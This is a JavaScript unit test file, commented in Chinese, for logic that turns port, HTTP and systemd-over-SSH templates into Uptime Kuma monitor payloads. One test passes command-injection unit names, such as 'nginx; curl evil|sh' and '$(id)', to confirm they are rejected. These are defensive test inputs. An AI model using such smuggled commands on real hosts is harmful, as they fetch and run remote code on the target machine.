// 建观测项（server/kuma/provision.ts）的纯逻辑：三类模板 → kuma-monitor add 的 payload、命名、映射合并。
// 真正写 Kuma 走 spawn（kuma/kuma-cli.ts），这里只钉输入输出。
// 运行：pnpm test:unit
import test from 'node:test'
import assert from 'node:assert/strict'
import {
  groupNameFor, planMonitors, mergeServiceRules,
} from '../../server/kuma/provision.js'

const base = {
  hostId: 'oj',
  address: '203.0.113.12',
  groupName: 'oj (Oracle · 东京)',
}

/* ---------------- groupNameFor ---------------- */

test('groupNameFor：有显示名用显示名，没有就用 id', () => {
  assert.equal(groupNameFor({ id: 'oj', label: 'oj (Oracle · 东京)' }), 'oj (Oracle · 东京)')
  assert.equal(groupNameFor({ id: 'oj', label: '  ' }), 'oj')
  assert.equal(groupNameFor({ id: 'oj', label: 'oj' }), 'oj')
})

/* ---------------- planMonitors ---------------- */

test('planMonitors：端口模板 → type=port，名字带组短名', () => {
  const out = planMonitors({ ...base, port: 443 })
  assert.deepEqual(out, [{
    name: 'oj / 端口 443（TCP）',
    payload: { type: 'port', name: 'oj / 端口 443（TCP）', hostname: '203.0.113.12', port: 443 },
  }])
})

test('planMonitors：HTTP 模板带可选关键字，没关键字就不带这个键', () => {
  const withKw = planMonitors({ ...base, http: { url: 'https://oj.example.com/', keyword: 'ok' } })
  assert.deepEqual(withKw[0].payload, {
    type: 'http', name: 'oj / HTTP 站点', url: 'https://oj.example.com/', method: 'GET', maxredirects: 10, keyword: 'ok',
  })
  const noKw = planMonitors({ ...base, http: { url: 'https://oj.example.com/' } })
  assert.equal('keyword' in noKw[0].payload, false)
})

test('planMonitors：systemd 服务 → type=ssh + is-active 命令', () => {
  const out = planMonitors({
    ...base,
    services: [{ unit: 'xray', ssh: { user: 'opc', key: 'KEY', port: 22 } }],
  })
  assert.deepEqual(out[0].payload, {
    type: 'ssh', name: 'oj / xray 服务', hostname: '203.0.113.12', port: 22,
    ssh_username: 'opc', ssh_auth_method: 'privateKey', ssh_private_key: 'KEY',
    ssh_command: 'systemctl is-active xray',
  })
})

test('planMonitors：三类都有时顺序固定 端口 → HTTP → 服务', () => {
  const out = planMonitors({
    ...base, port: 443, http: { url: 'https://x/' },
    services: [{ unit: 'a', ssh: { user: 'u', key: 'k' } }, { unit: 'b', ssh: { user: 'u', key: 'k' } }],
  })
  assert.deepEqual(out.map((m) => m.name), ['oj / 端口 443（TCP）', 'oj / HTTP 站点', 'oj / a 服务', 'oj / b 服务'])
})

test('planMonitors：什么都没勾就回空数组', () => {
  assert.deepEqual(planMonitors({ ...base }), [])
})

test('planMonitors：端口 / 地址非法直接抛错', () => {
  assert.throws(() => planMonitors({ ...base, port: 0 }), /端口/)
  assert.throws(() => planMonitors({ ...base, port: 70000 }), /端口/)
  assert.throws(() => planMonitors({ ...base, port: 443.5 }), /端口/)
  assert.throws(() => planMonitors({ ...base, address: '' , port: 443 }), /地址/)
  assert.throws(() => planMonitors({ ...base, http: { url: 'ftp://x/' } }), /http/)
})

test('planMonitors：单元名带 shell 元字符直接拒绝（ssh_command 会在目标机上按 shell 跑）', () => {
  for (const unit of ['nginx; curl evil|sh', 'nginx && id', 'a$(id)', 'a`id`', 'a b', 'a>b', 'a\nb']) {
    assert.throws(() => planMonitors({ ...base, services: [{ unit, ssh: { user: 'u', key: 'k' } }] }), /单元名只能是字母/, unit)
  }
})

test('planMonitors：正常单元名照常通过（含 @ 与 :）', () => {
  for (const unit of ['nginx', 'docker.service', 'getty@tty1', 'my-app:inst', 'a_b.c']) {
    const out = planMonitors({ ...base, services: [{ unit, ssh: { user: 'u', key: 'k' } }] })
    assert.equal(out[0].payload.ssh_command, 'systemctl is-active ' + unit)
  }
})

/* ---------------- mergeServiceRules ---------------- */

test('mergeServiceRules：同 host+unit 覆盖 monitor id，其余保留顺序，新规则追加', () => {
  const old = [
    { host: 'oj', unit: 'xray', monitor: 7 },
    { host: 'os', unit: 'sing-box', monitor: 125 },
  ]
  const out = mergeServiceRules(old, [
    { host: 'oj', unit: 'xray', monitor: 130 },
    { host: 'oj', unit: 'memwatch', monitor: 131 },
  ])
  assert.deepEqual(out, [
    { host: 'oj', unit: 'xray', monitor: 130 },
    { host: 'os', unit: 'sing-box', monitor: 125 },
    { host: 'oj', unit: 'memwatch', monitor: 131 },
  ])
  assert.deepEqual(mergeServiceRules(old, []), old)
})
